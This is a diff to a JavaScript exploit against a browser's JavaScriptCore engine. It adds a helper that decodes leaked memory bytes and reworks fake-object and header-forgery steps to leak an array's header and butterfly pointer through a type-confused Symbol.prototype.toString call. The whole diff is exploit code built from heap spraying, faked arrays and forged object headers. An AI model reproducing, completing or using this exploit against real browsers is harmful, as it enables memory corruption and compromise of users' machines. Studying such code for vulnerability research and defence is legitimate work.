@@ -31,6 +31,16 @@ function gc() {
     for (let i = 0; i < 0x60; i++) { new ArrayBuffer(0x1000000); }
 }
 
+function extract(s, offset) {
+    let result = [];
+    for (let i = offset; i < offset + 4; ++i) {
+	let tmp = s.charCodeAt(i + 7)
+	result.push((tmp & 0xFF).toString(16).padStart(2, '0'));
+	result.push((tmp >>> 8).toString(16).padStart(2, '0'));
+    }
+    return Int64.to_Int64("0x" + result.reverse().join(""));
+}
+
 function start()
 {
     var worker = document.getElementById("worker");
@@ -84,7 +94,7 @@ function callback(ev) {
 
     let fake_arr_1 = worker.a;
     let fake_arr_2 = worker.b;
-    var overwrite_obj = new X([1.1, 2.2]);
+    var overwrite_obj = new X([1.1, 2.2, 3.3, 4.4]);
     overwrite_obj.g = Int64.JSC_as_JSValue(0x0100180800000000);
     overwrite_obj.h = fake_arr_1;
 
@@ -96,15 +106,19 @@ function callback(ev) {
     document.leakAddr(fake_arr_2);
     */
  
-    var leaked_header = Int64.from_double(fake_arr_1[22]);
-    leaked_header.high = 0x01100300;
+    var leaked_obj_header = Int64.from_double(fake_arr_1[22]);
+    leaked_obj_header.high = 0x01100300;
     // alert(leaked_header);
 
-    overwrite_obj.g = Int64.JSC_as_JSValue(leaked_header);
+    overwrite_obj.g = Int64.JSC_as_JSValue(leaked_obj_header);
     overwrite_obj.h = fake_arr_2;
     overwrite_obj.o = Int64.JSC_as_JSValue(0x0002000000000002);
-    overwrite_obj.p = overwrite_obj;
+    overwrite_obj.p = overwrite_obj.i;
     var leaked_data = Symbol.prototype.toString.call(fake_arr_1);
+
+    var leaked_array_header = extract(leaked_data, 0);
+    var leaked_array_butterfly = extract(leaked_data, 4);
+    alert(leaked_array_butterfly);
 
     while (true) {}
 }
